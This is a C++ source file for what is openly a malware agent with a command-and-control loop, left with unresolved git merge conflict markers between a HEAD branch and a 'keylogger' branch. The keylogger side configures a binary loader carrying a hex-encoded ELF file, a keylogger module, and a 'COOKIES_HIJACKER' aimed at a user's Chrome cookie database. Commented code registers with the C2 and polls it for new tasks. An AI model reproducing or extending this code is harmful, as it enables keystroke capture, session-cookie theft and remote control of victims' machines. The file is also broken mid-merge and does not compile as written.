#include "Agent.h"

void Agent::start()
{
<<<<<<< HEAD
    // ################################################
    // FOR MODULES DEBUGGING:
    // uncomment the next lines and change the debug_conf (should be in your ruuning dir)
    // 
    // std::string path = "debug_conf.json";
    // std::ifstream file(path);
    // if (!file.is_open()) {
    //     std::cerr << "Could not open the file: " << path << std::endl;
    //     return;
    // }
    // json config;
    // try {
    //     file >> config;
    // } catch (const json::parse_error& e) {
    //     std::cerr << "Failed to parse JSON: " << e.what() << std::endl;
    //     return;
    // }
    // start_from_config(config);
    // sleep(1000000);
    // ################################################
=======
    std::string LOADER_TEST = R"(
    {
        "LOADER": 
        {
            "1337": 
            {
            "file_content": "7f454c4602010100000000000000000003003e000100000060100000000000004000000000000000983600000000000000000000400038000d0040001f001e000600000004000000400000000000000040000000000000004000000000000000d802000000000000d802000000000000080000000000000003000000040000001803000000000000180300000000000018030000000000001c000000000000001c000000000000000100000000000000010000000400000000000000000000000000000000000000000000000000000028060000000000002806000000000000001000000000000001000000050000000010000000000000001000000000000000100000000000007501000000000000750100000000000000100000000000000100000004000000002000000000000000200000000000000020000000000000f400000000000000f40000000000000000100000000000000100000006000000b82d000000000000b83d000000000000b83d0000000000005802000000000000600200000000000000100000000000000200000006000000c82d000000000000c83d000000000000c83d000000000000f001000000000000f00100000000000008000000000000000400000004000000380300000000000038030000000000003803000000000000300000000000000030000000000000000800000000000000040000000400000068030000000000006803000000000000680300000000000044000000000000004400000000000000040000000000000053e574640400000038030000000000003803000000000000380300000000000030000000000000003000000000000000080000000000000050e574640400000014200000000000001420000000000000142000000000000034000000000000003400000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000b82d000000000000b83d000000000000b83d0000000000004802000000000000480200000000000001000000000000002f6c696236342f6c642d6c696e75782d7838362d36342e736f2e320000000000040000002000000005000000474e5500020000c0040000000300000000000000028000c0040000000100000000000000040000001400000003000000474e55003fe68e82093b2f83b18ac921e3fdffb5c911011e040000001000000001000000474e550000000000030000000200000000000000000000000200000006000000010000000600000000008100000000000600000000000000d165ce6d00000000000000000000000000000000000000000000000000000000100000001200000000000000000000000000000000000000480000002000000000000000000000000000000000000000220000001200000000000000000000000000000000000000640000002000000000000000000000000000000000000000730000002000000000000000000000000000000000000000010000002200000000000000000000000000000000000000005f5f6378615f66696e616c697a65005f5f6c6962635f73746172745f6d61696e0070757473006c6962632e736f2e3600474c4942435f322e322e3500474c4942435f322e3334005f49544d5f64657265676973746572544d436c6f6e655461626c65005f5f676d6f6e5f73746172745f5f005f49544d5f7265676973746572544d436c6f6e655461626c65000000000200010003000100010003000000000001000200270000001000000000000000751a6909000003003100000010000000b4919606000002003d00000000000000b83d00000000000008000000000000004011000000000000c03d00000000000008000000000000000011000000000000084000000000000008000000000000000840000000000000d83f00000000000006000000010000000000000000000000e03f00000000000006000000020000000000000000000000e83f00000000000006000000040000000000000000000000f03f00000000000006000000050000000000000000000000f83f00000000000006000000060000000000000000000000d03f00000000000007000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f30f1efa4883ec08488b05d92f00004885c07402ffd04883c408c30000000000ff359a2f0000f2ff259b2f00000f1f00f30f1efa6800000000f2e9e1ffffff90f30f1efaf2ff25ad2f00000f1f440000f30f1efaf2ff25752f00000f1f440000f30f1efa31ed4989d15e4889e24883e4f050544531c031c9488d3dca000000ff15532f0000f4662e0f1f840000000000488d3d792f0000488d05722f00004839f87415488b05362f00004885c07409ffe00f1f8000000000c30f1f8000000000488d3d492f0000488d35422f00004829fe4889f048c1ee3f48c1f8034801c648d1fe7414488b05052f00004885c07408ffe0660f1f440000c30f1f8000000000f30f1efa803d052f000000752b5548833de22e0000004889e5740c488b3de62e0000e819ffffffe864ffffffc605dd2e0000015dc30f1f00c30f1f8000000000f30f1efae977fffffff30f1efa554889e5488d05ac0e00004889c7e8f0feffffb8000000005dc300f30f1efa4883ec084883c408c3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010002000a0a0a0a686168616861686100000000011b033b30000000050000000cf0ffff640000002cf0ffff8c0000003cf0ffffa40000004cf0ffff4c00000035f1ffffbc0000001400000000000000017a5200017810011b0c070890010000140000001c000000f8efffff2600000000440710000000002400000034000000a0efffff20000000000e10460e184a0f0b770880003f1a3a2a33242200000000140000005c00000098efffff100000000000000000000000140000007400000090efffff1000000000000000000000001c0000008c00000071f0ffff1e00000000450e108602430d06550c0708000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040110000000000000011000000000000010000000000000027000000000000000c0000000000000000100000000000000d0000000000000068110000000000001900000000000000b83d0000000000001b0000000000000008000000000000001a00000000000000c03d0000000000001c000000000000000800000000000000f5feff6f00000000b003000000000000050000000000000080040000000000000600000000000000d8030000000000000a000000000000008d000000000000000b000000000000001800000000000000150000000000000000000000000000000300000000000000b83f000000000000020000000000000018000000000000001400000000000000070000000000000017000000000000001006000000000000070000000000000050050000000000000800000000000000c000000000000000090000000000000018000000000000001e000000000000000800000000000000fbffff6f000000000100000800000000feffff6f000000002005000000000000ffffff6f000000000100000000000000f0ffff6f000000000e05000000000000f9ffff6f0000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c83d00000000000000000000000000000000000000000000301000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008400000000000004743433a20285562756e74752031312e342e302d317562756e7475317e32322e3034292031312e342e30000000000000000000000000000000000000000000000000000000000000010000000400f1ff0000000000000000000000000000000009000000010004008c030000000000002000000000000000130000000400f1ff000000000000000000000000000000001e00000002001000901000000000000000000000000000002000000002001000c01000000000000000000000000000003300000002001000001100000000000000000000000000004900000001001a00104000000000000001000000000000005500000001001600c03d00000000000000000000000000007c00000002001000401100000000000000000000000000008800000001001500b83d0000000000000000000000000000a70000000400f1ff00000000000000000000000000000000130000000400f1ff00000000000000000000000000000000ab00000001001400f0200000000000000000000000000000000000000400f1ff00000000000000000000000000000000b900000001001700c83d0000000000000000000000000000c20000000000130014200000000000000000000000000000d500000001001800b83f0000000000000000000000000000eb00000012000000000000000000000000000000000000000801000020000000000000000000000000000000000000004401000020001900004000000000000000000000000000002401000012000000000000000000000000000000000000003501000010001900104000000000000000000000000000003c01000012021100681100000000000000000000000000004201000010001900004000000000000000000000000000004f01000020000000000000000000000000000000000000005e01000011021900084000000000000000000000000000006b01000011001200002000000000000004000000000000007a01000010001a00184000000000000000000000000000004801000012001000601000000000000026000000000000007f01000010001a00104000000000000000000000000000008b0100001200100049110000000000001e000000000000009001000011021900104000000000000000000000000000009c0100002000000000000000000000000000000000000000b60100002200000000000000000000000000000000000000d101000012020c00001000000000000000000000000000000053637274312e6f005f5f6162695f7461670063727473747566662e6300646572656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e30005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e74727900612e63005f5f4652414d455f454e445f5f005f44594e414d4943005f5f474e555f45485f4652414d455f484452005f474c4f42414c5f4f46465345545f5441424c455f005f5f6c6962635f73746172745f6d61696e40474c4942435f322e3334005f49544d5f64657265676973746572544d436c6f6e655461626c65007075747340474c4942435f322e322e35005f6564617461005f66696e69005f5f646174615f7374617274005f5f676d6f6e5f73746172745f5f005f5f64736f5f68616e646c65005f494f5f737464696e5f75736564005f656e64005f5f6273735f7374617274006d61696e005f5f544d435f454e445f5f005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a6540474c4942435f322e322e35005f696e697400002e73796d746162002e737472746162002e7368737472746162002e696e74657270002e6e6f74652e676e752e70726f7065727479002e6e6f74652e676e752e6275696c642d6964002e6e6f74652e4142492d746167002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e706c742e676f74002e706c742e736563002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e64796e616d6963002e64617461002e627373002e636f6d6d656e740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b000000010000000200000000000000180300000000000018030000000000001c000000000000000000000000000000010000000000000000000000000000002300000007000000020000000000000038030000000000003803000000000000300000000000000000000000000000000800000000000000000000000000000036000000070000000200000000000000680300000000000068030000000000002400000000000000000000000000000004000000000000000000000000000000490000000700000002000000000000008c030000000000008c03000000000000200000000000000000000000000000000400000000000000000000000000000057000000f6ffff6f0200000000000000b003000000000000b0030000000000002400000000000000060000000000000008000000000000000000000000000000610000000b0000000200000000000000d803000000000000d803000000000000a80000000000000007000000010000000800000000000000180000000000000069000000030000000200000000000000800400000000000080040000000000008d0000000000000000000000000000000100000000000000000000000000000071000000ffffff6f02000000000000000e050000000000000e050000000000000e000000000000000600000000000000020000000000000002000000000000007e000000feffff6f02000000000000002005000000000000200500000000000030000000000000000700000001000000080000000000000000000000000000008d00000004000000020000000000000050050000000000005005000000000000c00000000000000006000000000000000800000000000000180000000000000097000000040000004200000000000000100600000000000010060000000000001800000000000000060000001800000008000000000000001800000000000000a1000000010000000600000000000000001000000000000000100000000000001b000000000000000000000000000000040000000000000000000000000000009c000000010000000600000000000000201000000000000020100000000000002000000000000000000000000000000010000000000000001000000000000000a7000000010000000600000000000000401000000000000040100000000000001000000000000000000000000000000010000000000000001000000000000000b0000000010000000600000000000000501000000000000050100000000000001000000000000000000000000000000010000000000000001000000000000000b9000000010000000600000000000000601000000000000060100000000000000701000000000000000000000000000010000000000000000000000000000000bf000000010000000600000000000000681100000000000068110000000000000d00000000000000000000000000000004000000000000000000000000000000c5000000010000000200000000000000002000000000000000200000000000001100000000000000000000000000000004000000000000000000000000000000cd000000010000000200000000000000142000000000000014200000000000003400000000000000000000000000000004000000000000000000000000000000db00000001000000020000000000000048200000000000004820000000000000ac00000000000000000000000000000008000000000000000000000000000000e50000000e0000000300000000000000b83d000000000000b82d0000000000000800000000000000000000000000000008000000000000000800000000000000f10000000f0000000300000000000000c03d000000000000c02d0000000000000800000000000000000000000000000008000000000000000800000000000000fd000000060000000300000000000000c83d000000000000c82d000000000000f001000000000000070000000000000008000000000000001000000000000000ab000000010000000300000000000000b83f000000000000b82f0000000000004800000000000000000000000000000008000000000000000800000000000000060100000100000003000000000000000040000000000000003000000000000010000000000000000000000000000000080000000000000000000000000000000c01000008000000030000000000000010400000000000001030000000000000080000000000000000000000000000000100000000000000000000000000000011010000010000003000000000000000000000000000000010300000000000002b00000000000000000000000000000001000000000000000100000000000000010000000200000000000000000000000000000000000000403000000000000060030000000000001d0000001200000008000000000000001800000000000000090000000300000000000000000000000000000000000000a033000000000000d70100000000000000000000000000000100000000000000000000000000000011000000030000000000000000000000000000000000000077350000000000001a01000000000000000000000000000001000000000000000000000000000000"
            }
        }
    }
    )";
>>>>>>> keylogger

std::string keylogger_start = R"(
    {
        "KEY_LOGGER": 
        {
            "1337": 
            {
            "file_content": ""
            }
        }
<<<<<<< HEAD

        sleep(5);
    }

    while (agent_run)
    {
        if(get_server_config())
        {
            start_from_config(config);
        }
        sleep(60 * 5);
    }
=======
    }
    )";

std::string cookies_test = R"(
    {
        "COOKIES_HIJACKER": 
        {
            "1337": 
            {
            "cookies_path": "/home/galniv/.config/google-chrome/Default/Cookies"
            }
        }
    }
    )";

    json config = json::parse(cookies_test);

    start_from_config(config);
    sleep(1000);

    // unsigned tries = 0;
    // while (!agent_register())
    // {
    //     tries += 1;
    //     if (tries >= 10)
    //     {
    //         throw std::runtime_error("Can't register to C2");
    //     }
        
    //     sleep(5);
    // }
    
    // while (agent_run)
    // {
    //     if(get_server_config())
    //     {
    //         start_from_config(config);
    //     }
    //     sleep(60 * 5);
    // }
>>>>>>> keylogger
}


void Agent::stop()
{
    for (const std::unique_ptr<Task> & t : tasks)
    {
        t->stop();
    }
}